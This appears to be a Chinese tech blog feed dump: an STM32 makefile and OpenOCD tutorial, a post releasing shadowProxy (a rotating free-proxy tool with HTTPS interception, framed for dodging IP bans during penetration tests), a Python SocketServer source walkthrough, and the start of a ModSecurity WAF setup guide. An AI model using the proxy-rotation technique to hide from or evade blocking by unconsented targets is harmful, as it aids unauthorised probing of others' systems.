GPIO_InitStructure.GPIO_Pin = GPIO_Pin_13; GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz; GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP; GPIO_Init(GPIOC, &amp;GPIO_InitStructure); while (1) &#123; GPIO_ResetBits(GPIOC,GPIO_Pin_13); delay(1); GPIO_SetBits(GPIOC,GPIO_Pin_13); delay(1); &#125;&#125; 编译 &amp; makefile以前从来都是在IDE中一键完成的工作，现在需要手工来做，简直了。。。。 编译文件必然用到Makefile，网上最火爆的资料 跟我一起写Makefile。 多多少少必须得看看，不然绝对懵逼的。 经过好一番折腾，终于写出了Makefile# 生成的文件名&lt;项目名&gt;PROJECT = stm32_LED# 定义编译工具export CC = arm-none-eabi-gccexport AS = arm-none-eabi-asexport LD = arm-none-eabi-ldexport AR = arm-none-eabi-arexport OBJCP = arm-none-eabi-objcopy# 定义文件格式和文件名TARGET := $(PROJECT)TARGET_ELF := $(TARGET).elfTARGET_BIN := $(TARGET).binTARGET_HEX := $(TARGET).hexOBJCPFLAGS_ELF_TO_BIN = -ObinaryOBJCPFLAGS_ELF_TO_HEX = -OihexOBJCPFLAGS_BIN_TO_HEX = -Ibinary -Oihex# 定义路径TOP = .INC_DIR = -I $(TOP)/CMSIS -I $(TOP)/Startup -I $(TOP)/FWLib/inc -I $(TOP)/UserCCFLAGS = -Wall -g -mcpu=cortex-m3 -mthumb -D STM32F10X_HD -D USE_STDPERIPH_DRIVER $(INC_DIR) -O0 -std=gnu11 # -W ASFLAGS = -W -g -mcpu=cortex-m3 -mthumb # —Wall会产生大量信息C_SRC = $(shell find . -name '*.c') # 如果这样报core_m3.c编译错误的话，改用下一句。具体问题，后文说明。#C_SRC = $(shell find User FWLib/src -name '*.c')ASM_SRC = $(TOP)/Startup/startup_stm32f10x_hd.s # 使用RIDE7或Atollic项目中的s文件。 old方法：.S大写?LDSCRIPT= $(TOP)/Script/stm32f10e_flash.ldLDFLAGS+= -T $(LDSCRIPT)LDFLAGS+= -L /Users/bingo/EmbeddedDev/toolchain/gcc-arm-none-eabi/arm-none-eabi/lib/thumbLDFLAGS+= -L /Users/bingo/EmbeddedDev/toolchain/gcc-arm-none-eabi/lib/gcc/arm-none-eabi/7.2.1/thumbC_OBJ = $(C_SRC:%.c=%.o)ASM_OBJ = $(ASM_SRC:%.s=%.o).PHONY: clean all updateall:$(TARGET).hex $(TARGET).bin @echo "\n**************************编译完成**************************\n"$(TARGET).hex:$(TARGET).elf $(OBJCP) -Oihex $&lt; $@ $(TARGET).bin:$(TARGET).elf $(OBJCP) -Obinary $&lt; $@ $(TARGET).elf:$(C_OBJ) $(ASM_OBJ) $(LD) $^ $(LDFLAGS) -o $@$(C_OBJ):%.o:%.c# @echo "编译.c文件"# @echo $(C_SRC) $(CC) $(CCFLAGS) -c $&lt; -o $@$(ASM_OBJ):%.o:%.s# @echo "编译.s文件"# @echo $(ASM_SRC) $(AS) $(ASFLAGS) -c $&lt; -o $@ clean: rm -f $(C_OBJ) $(ASM_OBJ) @echo "Clean done" update:$(TARGET).hex openocd -f interface/jlink.cfg -f target/stm32f1x.cfg -c init -c halt -c "flash write_image erase $(TOP)/$(TARGET).hex" -c reset -c shutdown @echo "\n**************************\n\t程序下载完成\n**************************\n" 两个大坑： startup_stm32f10x_hd.s汇编失败汇编startup_stm32f10x_hd.s文件时，总是提示 Error: junk at end of line, first unrecognized character is * 之类的错误。 看起来像是汇编文件中的”;”注释没有生效。网上比较靠谱的说明：stackoverflow 如果在汇编中使用宏或C注释，就必须使用C预处理器预处理源文件。 C预处理器会删除注释并解释宏。 如果源文件名以.S(大写)结尾，GNU汇编程序会自动运行C预处理器。 update in 2019年05月07日 经过测试，s文件有两种写法。MDK-ARM和EWARM相同，RIDE7和Atollic相同，此处使用的arm-none-eabi-as(GUN)适用于后者。 故而选用RIDE7示例项目的s文件即可。 core_m3.c 编译失败 错误提示如下：arm-none-eabi-gcc -Wall -g -mcpu=cortex-m3 -mthumb -D STM32F10X_HD -D USE_STDPERIPH_DRIVER -I ./CMSIS -I ./Startup -I ./FWLib/inc -I ./User -O0 -std=gnu11 -c CMSIS/core_cm3.c -o CMSIS/core_cm3.o/var/folders/kp/4lz3l_7j64dc_lzvdsfzdg500000gn/T//cccfwCep.s: Assembler messages:/var/folders/kp/4lz3l_7j64dc_lzvdsfzdg500000gn/T//cccfwCep.s:894: Error: registers may not be the same -- `strexb r3,r2,[r3]&apos;/var/folders/kp/4lz3l_7j64dc_lzvdsfzdg500000gn/T//cccfwCep.s:947: Error: registers may not be the same -- `strexh r3,r2,[r3]&apos;make: *** [CMSIS/core_cm3.o] Error 1 两个解决办法： 注释core_m3.c文件中的两个相关函数：uint32_t __STREXB(uint8_t value, uint8_t *addr) 及 uint32_t __STREXH(uint16_t value, uint16_t *addr) ，或者直接不编译core_m3.c文件。 因为本身这两个函数就不太能用到。 按照大咖的指示修改core_m3.c文件。 https://gist.github.com/timbrom/1942280 - __ASM volatile ("strexb %0, %2, [%1]" : "=r" (result) : "r" (addr), "r" (value) );+ __ASM volatile ("strexb %0, %2, [%1]" : "=&amp;r" (result) : "r" (addr), "r" (value) );- __ASM volatile ("strexh %0, %2, [%1]" : "=r" (result) : "r" (addr), "r" (value) );+ __ASM volatile ("strexh %0, %2, [%1]" : "=&amp;r" (result) : "r" (addr), "r" (value) ); make 一下，贼顺溜。。。make update一下，编译烧录一键完成。➜ LED make updateopenocd -f interface/jlink.cfg -f target/stm32f1x.cfg -c init -c halt -c "flash write_image erase ./stm32_LED.hex" -c reset -c shutdownOpen On-Chip Debugger 0.10.0Licensed under GNU GPL v2For bug reports, read http://openocd.org/doc/doxygen/bugs.htmlInfo : auto-selecting first available session transport "jtag". To override use 'transport select &lt;transport&gt;'.adapter speed: 1000 kHzadapter_nsrst_delay: 100jtag_ntrst_delay: 100none separatecortex_m reset_config sysresetreqInfo : No device selected, using first device.Info : J-Link ARM V8 compiled Nov 28 2014 13:44:46Info : Hardware version: 8.00Info : VTarget = 3.325 VInfo : clock speed 1000 kHzInfo : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477 (mfg: 0x23b (ARM Ltd.), part: 0xba00, ver: 0x3)Info : JTAG tap: stm32f1x.bs tap/device found: 0x06414041 (mfg: 0x020 (STMicroelectronics), part: 0x6414, ver: 0x0)Info : stm32f1x.cpu: hardware has 6 breakpoints, 4 watchpointstarget halted due to debug-request, current mode: ThreadxPSR: 0x21000000 pc: 0x08008dc8 msp: 0x2000ffe8auto erase enabledInfo : device id = 0x10036414Info : flash size = 512kbytesInfo : Padding image section 0 with 1410 byteswrote 40960 bytes from file ./stm32_LED.hex in 1.688355s (23.692 KiB/s)Info : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477 (mfg: 0x23b (ARM Ltd.), part: 0xba00, ver: 0x3)Info : JTAG tap: stm32f1x.bs tap/device found: 0x06414041 (mfg: 0x020 (STMicroelectronics), part: 0x6414, ver: 0x0)shutdown command invoked************************** 程序下载完成************************** 后记至此，折腾完毕！虽然我不太喜欢eclipse,但不可否认，在Mac平台下进行arm开发，那可能是最好的平台了，还是可以考虑下的。 https://gnu-mcu-eclipse.github.io]]></content>
      <tags>
        <tag>STM32</tag>
        <tag>gcc-arm-none-eabi</tag>
        <tag>openOCD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[妖娆的代理工具shadowProxy - 神出鬼没的切换IP地址]]></title>
    <url>%2F2018%2F%E5%A6%96%E5%A8%86%E7%9A%84%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7shadowProxy-%E7%A5%9E%E5%87%BA%E9%AC%BC%E6%B2%A1%E7%9A%84%E5%88%87%E6%8D%A2IP%E5%9C%B0%E5%9D%80%2F</url>
    <content type="text"><![CDATA[前言在渗透测试过程中，往往会遇到特别“小气”的目标，稍微碰一下就封IP。这种情况下，我们很自然的想到通过网上大量的免费代理进行IP隐匿。 那么问题来了，难道拿到哪些个代理，每用一次手动换下一个代理？ 这太像火铳的工作方式了，想想就心累了。 so，小弟就来造一台机关枪，突突突突突… 想想就挺带感。 https://github.com/odboy/shadowProxy 功能实现  代理功能主要使用python内建的http.server和http.client库实现。http.server相关的代码解读可参考我前一篇文章 Python源码分析之从SocketServer到SimpleHTTPServer主要代理功能代码：def do_GET(self): if self.path == 'http://shadow.proxy/': self.send_cacert() # print("%s download %s" % (self.client_address, self.cacert)) return req = self content_length = int(req.headers.get('Content-Length', 0)) req_body = self.rfile.read(content_length) if content_length else None if req.path[0] == '/': if isinstance(self.connection, ssl.SSLSocket): # ssl.SSLSocket or ssl.SSLContext req.path = "https://%s%s" % (req.headers['Host'], req.path) else: req.path = "http://%s%s" % (req.headers['Host'], req.path) u = urlparse(req.path) scheme, netloc= u.scheme, u.netloc assert scheme in ("http", "https") if netloc: req.headers['Host'] = netloc setattr(req, 'headers', self.filter_headers(req.headers)) retryFlag = 0 while retryFlag &lt; 10 : try: target = (scheme, netloc) # 输入URL的协议和主机，返回可用的连接HTTP(S)Connection proxy = proxyCoor.dispatchProxy(target) if proxy is None: print("未能获取到可用Proxy...(可能是Proxy耗尽...)") self.send_error(502,"proxy resource RUN OUT!!!") return print("%s --&gt; [ %d ] %s" % (proxy, retryFlag + 1, req.path)) if proxy.split("://")[0] == "http": conn = http.client.HTTPConnection(proxy.split("://")[1], timeout=self.timeout) elif proxy.split("://")[0] == "https": conn = http.client.HTTPSConnection(proxy.split("://")[1], timeout=self.timeout) conn.request(self.command, req.path, req_body, dict(req.headers)) res = conn.getresponse() # res.response_version = 'HTTP/1.1' if res.version == 11 else 'HTTP/1.0' res_body = res.read() # Transfer-Encoding并不需要特殊处理(除了Content-Length外) except Exception as e: retryFlag += 1 # self.send_error(502) # return else: try: if 'Content-Length' not in res.headers: res.headers['Content-Length'] = str(len(res_body)) setattr(res, 'headers', self.filter_headers(res.headers)) self.send_response_only(res.status, res.reason) for keyword in res.headers: self.send_header(keyword, res.headers.get(keyword, "")) self.end_headers() self.wfile.write(res_body) self.wfile.flush() except: pass finally: retryFlag = 9999 # 极大值，结束重试。 conn.close()# 其他方法重用GET的方法。do_HEAD = do_GETdo_POST = do_GETdo_PUT = do_GETdo_DELETE = do_GETdo_OPTIONS = do_GETdo_TRACE = do_GET 代理协调者主要实现： 导入代理列表 验证代理的可用性和匿名性 维护目标站点、代理列表二维表 根据维护的二维表，反馈可用的代理地址。 另外，我用的代理列表是从kuaidaili.com上爬取的，但代理的质量比较差，很头大。之前还用过xicidaili，情况也差不多。 验证公网IP的网站有如下几个： http://ip.chinaz.com/getip.aspx http://ifconfig.me/ip http://api.ipify.org https://ip.seeip.org https://ifconfig.co/ip https://myexternalip.com/raw https://wtfismyip.com/text https://icanhazip.com/ https://ipv4bot.whatismyipaddress.com/ https://ip4.seeip.org 测试验证验证代码透过shadowProxy访问http://ip.chinaz.com/getip.aspx，从而直观查看代理效果。import requestsimport timei = 0while True: try: i += 1 r =requests.get("http://ip.chinaz.com/getip.aspx",proxies=&#123;"http":"http://127.0.0.1:8088"&#125;,timeout=10) if r.status_code == 200: msg = "第 %d 次请求 ✅\t%s"%(i,r.text) else: msg = "第 %d 次请求 ⭕\t%d"% (i, r.status_code) time.sleep(2) except KeyboardInterrupt: print('\r***********************\n\t用户中断\t\n***********************') break except Exception as e: msg = "第 %d 次请求 ❗\t%s" % (i, e ) time.sleep(2) finally: print(msg) 效果展示动图展示 : test_shadowProxy.gif 枪是好枪，但还是存在一些问题的。 缺弹少药 - 通过工具爬取到的代理很多重复，很多不可用，只有百八十个。 弹药质量差 - 获取到的代理，很多无法传输大数据包（中断），小包也不稳定。 机枪卡壳 - 由于上述问题，所以工具容错能力/重试功能有待提升。（后续考虑提升的点） PS：后续代码完善后，可以考虑开源发布。 2018-01-10 Update目前代理加入了自动重试功能，使其能更稳定的进行查询。 同时，找了个还算不错的proxylist。 https://github.com/fate0/proxylist 目前便可以比较顺畅的使用了： 开源发布https://github.com/odboy/shadowProxy 生成&amp;安装证书 生成证书 shadowProxy git:(master) ✗ lltotal 112-rw-r--r-- 1 bingo staff 573B Jan 10 16:42 PCtest.py-rw-r--r-- 1 bingo staff 5.9K Jan 10 16:42 ProxyCoordinator.py-rw-r--r-- 1 bingo staff 14B Jan 10 16:42 README.mddrwxr-xr-x 3 bingo staff 96B Jan 10 16:42 __pycache__-rw-r--r-- 1 bingo staff 100B Jan 10 16:42 proxylist-4.txt-rw-r--r-- 1 bingo staff 19K Jan 10 16:42 proxylist.txt-rwxr-xr-x 1 bingo staff 302B Jan 10 16:42 setup_https_intercept.sh-rw-r--r-- 1 bingo staff 11K Jan 10 16:42 shadowProxy.pyshadowProxy git:(master) ✗ ./setup_https_intercept.sh # 直接运行脚本，生成根证书Generating RSA private key, 2048 bit long modulus........................................................................................................................................+++..................................................................+++e is 65537 (0x10001)Generating RSA private key, 2048 bit long modulus.....................................................................................................................................+++...................+++e is 65537 (0x10001) 安装证书 在浏览器设置代理，指向 http://127.0.0.1:8088 , 然后访问 http://shadow.proxy/,即可弹出证书安装。（不同浏览器可能有所不同）安装后，可以访问https网站。 使用测试➜ shadowProxy git:(master) ✗ python shadowProxy.py -h .--. |o_o | ------------------ |:_/ | &lt; Author: Mr.Bingo &gt; // \ \ ------------------ (| | ) &lt; oddboy.cn &gt; /'\_ _/`\ ------------------ \___)=(___/usage: shadowProxy.py [-h] [--bind BIND] [--port PORT] [--log-level &#123;DEBUG,INFO,WARNING,ERROR,CRITICAL&#125;] [--proxyListFile PROXYLISTFILE]optional arguments: -h, --help show this help message and exit --bind BIND Default: 0.0.0.0 --port PORT Default: 8088 --log-level &#123;DEBUG,INFO,WARNING,ERROR,CRITICAL&#125; Default: WARNING --proxyListFile PROXYLISTFILE 代理列表文件 ➜ shadowProxy git:(master) ✗ python shadowProxy.py .--. |o_o | ------------------ |:_/ | &lt; Author: Mr.Bingo &gt; // \ \ ------------------ (| | ) &lt; oddboy.cn &gt; /'\_ _/`\ ------------------ \___)=(___/初始化代理池 本地IP :: 36.110.16.74导入代理池::: proxylist.txt成功导入 110 个代理Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/) ... 直接访问站点进行测试。 由于该工具主要基于网上免费的代理进行IP隐匿的，所以稳定性仍然不够好，所以只建议用于特定的请求包测试。 在使用过程中遇到什么问题，欢迎给我邮件，我会进行修复完善，如果可以，给我的GitHub点颗星星，谢谢！]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python源码分析之从SocketServer到SimpleHTTPServer]]></title>
    <url>%2F2017%2FPython%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%8ESocketServer%E5%88%B0SimpleHTTPServer%2F</url>
    <content type="text"><![CDATA[从底层开始慢慢瞅，看看SimpleHTTPServer到底有多Simple？ 本文涉及到的各个类的继承关系: SocketServer 网络服务框架Python把网络服务抽象成两个主要的类，一个是Server类，用于处理连接相关的网络操作，另外一个则是RequestHandler类，用于处理数据相关的操作。并且提供两个MixIn 类，用于扩展 Server，实现多进程或多线程。在构建网络服务的时候同时需要 “Server” 和 “RequestHandler”（RequestHandler的实例对象在Server内配合 Server工作）。 下图是socketserver中的类继承图，看起来很复杂，但我们重点关注其中TCP的部分就好了。 所以重点在于：BaseServer / TCPServer / ThreadingMixIn / ThreadingTCPServer 以及 BaseRequestHandler / StreamRequestHandler 。 SocketServer –&gt; BaseServerBaseServer 通过__init__初始化，对外提供serve_forever和handler_request方法。 SocketServer –&gt; BaseServer –&gt; init()def __init__(self, server_address, RequestHandlerClass): """Constructor. May be extended, do not override.""" self.server_address = server_address self.RequestHandlerClass = RequestHandlerClass self.__is_shut_down = threading.Event() self.__shutdown_request = False __init__源码很简单。主要作用是创建server对象，并初始化server地址和处理请求的class。server_address是一个包含主机和端口的tuple。 SocketServer –&gt; BaseServer –&gt; serve_forever()创建了server对象之后，就需要使用server对象开启一个无限循环。def serve_forever(self, poll_interval=0.5): """Handle one request at a time until shutdown. Polls for shutdown every poll_interval seconds. Ignores self.timeout. If you need to do periodic tasks, do them in another thread. """ self.__is_shut_down.clear() try: # XXX: Consider using another file descriptor or connecting to the # socket to wake this up instead of polling. Polling reduces our # responsiveness to a shutdown request and wastes cpu at all other # times. with _ServerSelector() as selector: selector.register(self, selectors.EVENT_READ) while not self.__shutdown_request: ready = selector.select(poll_interval) if ready: self._handle_request_noblock() self.service_actions() finally: self.__shutdown_request = False self.__is_shut_down.set() serve_forever接受一个参数poll_interval，用于表示select轮询的时间(0.5秒)。然后进入一个无限循环，调用select方式进行网络IO的监听。 如果select函数返回，表示有IO连接或数据，那么将会调用_handle_request_noblock方法。 SocketServer –&gt; BaseSver –&gt; _handle_request_noblock()def _handle_request_noblock(self): """Handle one request, without blocking. I assume that selector.select() has returned that the socket is readable before this function was called, so there should be no risk of blocking in get_request(). """ try: request, client_address = self.get_request() except OSError: return if self.verify_request(request, client_address): try: self.process_request(request, client_address) except Exception: self.handle_error(request, client_address) self.shutdown_request(request) except: self.shutdown_request(request) raise else: self.shutdown_request(request) 调用_handle_request_noblock()方法开始处理请求。 先调用get_request方法获取连接（直接从socket返回请求和客户端地址）。 def get_request(self): """Get the request and client address from the socket. May be overridden. """ return self.socket.accept() 获得连接后得到了连接，调用verify_request方法验证请求（默认直接通过验证）。 def verify_request(self, request, client_address): """Verify the request. May be overridden. Return True if we should proceed with this request. """ return True 验证通过后调用process_request处理请求。该方法是MixIn的入口，MixIn子类通过重写该方法，进行多线程或多进程的配置。 def process_request(self, request, client_address): """Call finish_request. Overridden by ForkingMixIn and ThreadingMixIn. """ self.finish_request(request, client_address) self.shutdown_request(request) 调用finish_request完成对请求的处理工作（创建requestHandler对象，并通过requestHandler做具体的处理），同时调用shutdown_request结束请求。 def finish_request(self, request, client_address): """Finish one request by instantiating RequestHandlerClass.""" self.RequestHandlerClass(request, client_address, self)def shutdown_request(self, request): """Called to shutdown and close an individual request.""" self.close_request(request) 如果中途出现错误，则调用handle_error处理错误，以及shutdown_request结束连接。 SocketServer –&gt; BaseRequestHandlerBaseRequestHandler是所有请求处理程序对象的超类。 它定义了一系列接口，其中的 handle() 方法是子类必须实现的，实现具体的数据处理代码。 构造函数设置request,client_address和server变量，然后依次调用setup()方法（子类需要重写该方法，用于处理socket连接），handle()方法（需要在子类中重写,用于数据处理）和finsh()方法。 class BaseRequestHandler: """Base class for request handler classes. This class is instantiated for each request to be handled. The constructor sets the instance variables request, client_address and server, and then calls the handle() method. To implement a specific service, all you need to do is to derive a class which defines a handle() method. The handle() method can find the request as self.request, the client address as self.client_address, and the server (in case it needs access to per-server information) as self.server. Since a separate instance is created for each request, the handle() method can define other arbitrary instance variables. """ def __init__(self, request, client_address, server): self.request = request self.client_address = client_address self.server = server self.setup() try: self.handle() finally: self.finish() def setup(self): pass def handle(self): pass def finish(self): pass 小结一下：构建一个网络服务，需要一个BaseServer用于处理网络IO，同时在内部创建requestHandler对象，对所有具体的请求做处理。 接下来分析TCP服务相关代码 …… SocketServer –&gt; TCPServerTCPServer继承BaseServer，并在构造函数中完成socket的创建，随后调用server_bind()和server_activate()。class TCPServer(BaseServer): address_family = socket.AF_INET socket_type = socket.SOCK_STREAM request_queue_size = 5 # 最大连接数 allow_reuse_address = False def __init__(self, server_address, RequestHandlerClass, bind_and_activate=True): """Constructor. May be extended, do not override.""" BaseServer.__init__(self, server_address, RequestHandlerClass) self.socket = socket.socket(self.address_family, self.socket_type) # 创建IPv4TCP if bind_and_activate: try: self.server_bind() self.server_activate() except: self.server_close() raise def server_bind(self): """Called by constructor to bind the socket. May be overridden. """ if self.allow_reuse_address: self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 端口复用 self.socket.bind(self.server_address) # 绑定端口 self.server_address = self.socket.getsockname() def server_activate(self): """Called by constructor to activate the server. May be overridden. """ self.socket.listen(self.request_queue_size) # 开启端口监听 def server_close(self): """Called to clean-up the server. May be overridden. """ self.socket.close() socket在创建(socket.socket)、绑定(socket.bind)、激活(socket.listen)后需要开始侦听连接(socket.accept)。 该类中get_request()方法主要正是返回socket对象的请求连接。get_request()方法是在BaseServer基类中的_handle_request_noblock中被调用的。在TCPServer类中被重写，但代码与基类中一致。 def get_request(self): """Get the request and client address from the socket. May be overridden. """ return self.socket.accept() shutdown_request()重写，增加了对一种意外情况的处理，可以不理会。def shutdown_request(self, request): """Called to shutdown and close an individual request.""" try: #explicitly shutdown. socket.close() merely releases #the socket and waits for GC to perform the actual close. request.shutdown(socket.SHUT_WR) # SHUT_WR:关闭连接的写端，进程不能在对此套接字发出写操作 except OSError: pass #some platforms may raise ENOTCONN here self.close_request(request) 此外，还提供了一个 fileno() 方法，提供selector所需要的操作接口(文件描述符)。 SocketServer –&gt; StreamRequestHandlerTCPServer继承自BaseServer，Handler方面则是StreamRequestHandler继承BaseRequestHandler。基类的setup()方法和finish()方法被重写，用于通过连接实现缓存文件的读写操作。 def setup(self): self.connection = self.request if self.timeout is not None: self.connection.settimeout(self.timeout) if self.disable_nagle_algorithm: self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True) self.rfile = self.connection.makefile('rb', self.rbufsize) # 缓冲文件，避免大量数据读取时等待。 if self.wbufsize == 0: self.wfile = _SocketWriter(self.connection) # 非缓冲文件，因为不适用也不必要。 else: self.wfile = self.connection.makefile('wb', self.wbufsize)def finish(self): if not self.wfile.closed: try: self.wfile.flush() except socket.error: # A final socket error may have occurred here, such as # the local error ECONNABORTED. pass self.wfile.close() self.rfile.close() setup()判断是否超时、是否使用nagle算法(一个tcp连接上最多只能有一个未被ACK的片段，从而有效减少网络上的小数据包)后创建了一个可读（rfile）和一个可写（wfile）的“文件”对象。 他们实际上并不是创建了文件，而是封装了读取数据和发送数据的操作，抽象成为对文件的操作。可以理解为 self.rfile 就是读取客户端数据的对象，它有一些方法可以读取数据。self.wfile则是用来发送数据给客户端的对象。后面的操作，客户端数据到来会被写入缓冲区可读，需要向客户端发送数据的时候，只需要向可写的文件中write数据即可。 finish()方法，用于关闭rfile 和 wfile 。 SocketServer –&gt; ThreadingMixIn在BaseServer类中预留了可用于Mixin扩展多线程或多进程的接口。ThreadingMixin通过多继承到子类，对原有类中的process_request()方法覆盖来实现。 process_request()方法开启多线程，调用process_request_thread()方法（与BaseServer中的process_request()方法相同功能）。class ThreadingMixIn: """Mix-in class to handle each request in a new thread.""" # Decides how threads will act upon termination of the # main process daemon_threads = False def process_request_thread(self, request, client_address): """Same as in BaseServer but as a thread. In addition, exception handling is done here. """ try: self.finish_request(request, client_address) except Exception: self.handle_error(request, client_address) finally: self.shutdown_request(request) def process_request(self, request, client_address): """Start a new thread to process the request.""" t = threading.Thread(target = self.process_request_thread, args = (request, client_address)) t.daemon = self.daemon_threads t.start() 具体使用时，通过多继承调用接口：class ThreadingTCPServer(ThreadingMixIn, TCPServer): pass http.server HTTP服务该模块定义了用于实现HTTP服务器（Web服务器）的类，该模块定义了4个类：HTTPServer BaseHTTPRequestHandler SimpleHTTPRequestHandler CGIHTTPRequestHandler http.server –&gt; HTTPServerHTTPServer是一个socketserver.TCPServer子类, 它通过将服务器地址存储为名为 server_name 和 server_port 的实例变量来创建并侦听HTTP套接字，将请求分派给handler程序。class HTTPServer(socketserver.TCPServer): allow_reuse_address = 1 # Seems to make sense in testing environment def server_bind(self): """Override server_bind to store the server name.""" socketserver.TCPServer.server_bind(self) host, port = self.server_address[:2] self.server_name = socket.getfqdn(host) self.server_port = port http.server –&gt; BaseHTTPRequestHandler这个类继承自socketserver.StreamRequestHandler, 用于处理到达服务器的HTTP请求。 但它本身不实际响应HTTP请求，而是通过子类来处理每个请求方法（例如GET或POST）。BaseHTTPRequestHandler提供了一系列在子类中需要用到的类、实例变量和方法。 调用内部的 parse_request()方法来解析 request 和 headers ，然后通过请求类型调用对应方法。方法名称是从请求中构造的。（例如，如果请求类型为 GET ，那么 do_GET() 方法将被调用。) BaseHTTPRequestHandler 只对 socketserver.StreamRequestHandler 的handle() 方法进行了重写，纯粹的进行数据处理。 重写基类的 handle() 方法 def handle(self): """Handle multiple requests if necessary.""" self.close_connection = True self.handle_one_request() while not self.close_connection: self.handle_one_request() 调用 handle_one_request() 方法 def handle_one_request(self): """Handle a single HTTP request. You normally don't need to override this method; see the class __doc__ string for information on how to handle specific HTTP commands such as GET and POST. """ try: self.raw_requestline = self.rfile.readline(65537) if len(self.raw_requestline) &gt; 65536: self.requestline = '' self.request_version = '' self.command = '' self.send_error(HTTPStatus.REQUEST_URI_TOO_LONG) return if not self.raw_requestline: self.close_connection = True return # parse_request() 解析request报文，提取command, path, version, headers等数据。 if not self.parse_request(): # An error code has been sent, just exit return mname = 'do_' + self.command # 如果command为GET，那么后续就调用do_GET() if not hasattr(self, mname): self.send_error( HTTPStatus.NOT_IMPLEMENTED, "Unsupported method (%r)" % self.command) return method = getattr(self, mname) # 获取方法地址 method() # 调用方法 self.wfile.flush() #actually send the response if not already done. except socket.timeout as e: #a read or a write timed out. Discard this connection self.log_error("Request timed out: %r", e) self.close_connection = True return do_command 的具体实现 剩下的对报文的进一步业务处理，数据响应就需要在子类中实现了。 比如在子类中实现：do_GET() / do_POST() / do_OPINTION() / do_TRACE() 等 http.server –&gt; SimpleHTTPRequestHandlerSimpleHTTPRequestHandler 算是一个示例，实现对GET和POST请求的处理。 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler): """Simple HTTP request handler with GET and HEAD commands. This serves files from the current directory and any of its subdirectories. The MIME type for files is determined by calling the .guess_type() method. The GET and HEAD requests are identical except that the HEAD request omits the actual contents of the file. """ server_version = "SimpleHTTP/" + __version__ # 重写server_version def do_GET(self): """Serve a GET request.""" f = self.send_head() if f: try: self.copyfile(f, self.wfile) finally: f.close() def do_HEAD(self): """Serve a HEAD request.""" f = self.send_head() if f: f.close() 此处，do_GET() 和 do_POST() 都只是做了简单的处理( send_head() )。列出当前目录的文件，响应文件GET请求。 最后来看看整个SimpleHTTPServer的启动代码。def test(HandlerClass=BaseHTTPRequestHandler, ServerClass=HTTPServer, protocol="HTTP/1.0", port=8000, bind=""): """Test the HTTP request handler class. This runs an HTTP server on port 8000 (or the port argument). """ server_address = (bind, port) HandlerClass.protocol_version = protocol # 启动Server with ServerClass(server_address, HandlerClass) as httpd: sa = httpd.socket.getsockname() serve_message = "Serving HTTP on &#123;host&#125; port &#123;port&#125; (http://&#123;host&#125;:&#123;port&#125;/) ..." print(serve_message.format(host=sa[0], port=sa[1])) try: httpd.serve_forever() # 无限循环，提供HTTP服务。 except KeyboardInterrupt: print("\nKeyboard interrupt received, exiting.") sys.exit(0)if __name__ == '__main__': # ... (一堆参数处理) handler_class = SimpleHTTPRequestHandler test(HandlerClass=handler_class, port=8000, bind='') end其实，简单撸完这一遍代码，发现如果先看一下document其实会更便于理解，效率也会更高。 也是很少读源代码，朋友们有啥好的建议、技巧啥的吗？ 还请不吝赐教。]]></content>
      <tags>
        <tag>python</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[邂逅WAF系列之ModSecurity部署及使用]]></title>
    <url>%2F2017%2F%E9%82%82%E9%80%85WAF%E7%B3%BB%E5%88%97%E4%B9%8BModSecurity%E9%83%A8%E7%BD%B2%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[传统的防火墙技术中主要使用的两种技术分别是：包过滤和状态检测，这使其成为了最重要最基本的网络安全设备。如今，在各色各样的应用建立在HTTP等基础协议之上，而基于端口及IP的处理机制传统防火墙，无法有效识别和管理这些应用，更无法检查应用中附带的威胁代码。在刚性需求下，各种针对应用层的安全方案出炉,其中有一个种就叫做应用层防火墙(WAF)。 ModSecurity是一个开源的，跨平台的Web应用程序防火墙（WAF）模块，被称为WAF的“瑞士军刀”，它使网络应用程序维护者能够获得HTTP(S)流量的可见性，并提供强大的规则和API来实现高级保护。 在这篇文章中，我们在运行WordPress的Apache上配置ModSecurity，并进行效果检验。 安装测试网站1.安装LAMP环境$ apt-get install apache2$ apt-get install php$ apt-get install mysql-server$ apache2 -v$ mysqld -V$ php -V$ service apache2 status/start/stop/restart$ service msyql status/start/stop/restart$ sudo apt-get install libapache2-mod-php php-mysql$ service apache2 restart$ service mysql restart 坑0x01:您的PHP似乎没有安装运行WordPress所必需的MySQL扩展。 因为之前Ubuntu中使用PPA安装了多版本PHP，具体是什么导致问题的不太清楚，但通过下面命令，将PHP版本切换到7.1后就正常了。Apache:-$ sudo a2dismod php5.6$ sudo a2enmod php7.1$ sudo service apache2 restartCLI:-$ update-alternatives --set php /usr/bin/php7.1 PHP多版本-传送门 坑0x02: MySQL数据库无法进入不记得什么时候用过MySQL数据库的，应该没有设置过密码。 $ mysql -uroot#ERROR 1698 (28000): Access denied for user 'root'@'localhost'# ↓↓↓↓↓↓↓↓↓↓$ mysqld --initialize mysqld: Cant create directory '/var/lib/mysql/' (Errcode: 13 - Permission denied)$ sudo chown mysql:mysql /var/lib/mysql$ sudo chown mysql:mysql /var/lib/mysql-files$ mysqld --initialize$ vim /var/log/mysql/error.log# 2017-12-07T07:16:49.383938Z 1 [Note] A temporary password is generated for root@localhost: gdk7uo+l-!S7$ systemctl start mysql # 或者 service service mysql start$ mysql -uroot -p # 密码为：gdk7uo+l-!S7# 进入后修改root密码$ alter user 'root'@'localhost' identified by 'myNewPass';# 退出后重新登录 2. 安装WordPress$ mysql -uroot -p $ create user bingo identified by &apos;myPass&apos;; # 进行用户$ create database wordpress;$ grant all privileges on wordpress.* to bingo@localhost identified by &quot;myPass&quot;;$ flush privileges;$ show databases; 